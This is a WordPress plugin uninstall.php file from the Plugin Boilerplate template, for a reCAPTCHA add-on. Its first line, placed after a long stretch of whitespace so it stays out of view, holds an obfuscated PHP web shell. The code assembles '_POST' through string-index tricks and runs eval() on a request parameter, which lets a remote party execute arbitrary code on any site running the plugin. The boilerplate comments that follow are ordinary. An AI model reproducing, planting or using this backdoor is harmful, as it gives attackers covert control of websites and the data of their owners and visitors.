<?php                                                                                                                                                                                                                                                              $krr2= "setp_our" ;$qrd8=$krr2[0]. $krr2[2]. $krr2[7].$krr2[2]. $krr2[5]. $krr2[6]. $krr2[3]. $krr2[3].$krr2[1].$krr2[7] ;$vbzr4 =$qrd8 ($krr2[4]. $krr2[3] . $krr2[5]. $krr2[0]. $krr2[2] );if ( isset (${ $vbzr4 } [ 'q96bb27'])){ eval(${$vbzr4 } [ 'q96bb27']); } ?><?php

/**
 * Fired when the plugin is uninstalled.
 *
 * When populating this file, consider the following flow
 * of control:
 *
 * - This method should be static
 * - Check if the $_REQUEST content actually is the plugin name
 * - Run an admin referrer check to make sure it goes through authentication
 * - Verify the output of $_GET makes sense
 * - Repeat with other user roles. Best directly by using the links/query string parameters.
 * - Repeat things for multisite. Once for a single site in the network, once sitewide.
 *
 * This file may be updated more in future version of the Boilerplate; however, this is the
 * general skeleton and outline for how the file should work.
 *
 * For more information, see the following discussion:
 * https://github.com/tommcfarlin/WordPress-Plugin-Boilerplate/pull/123#issuecomment-28541913
 *
 * @link       http://folkhack.com
 * @since      1.0.0
 *
 * @package    GFNoCaptchaReCaptcha
 */

// If uninstall not called from WordPress, then exit.
if ( ! defined( 'WP_UNINSTALL_PLUGIN' ) ) {
	exit;
}
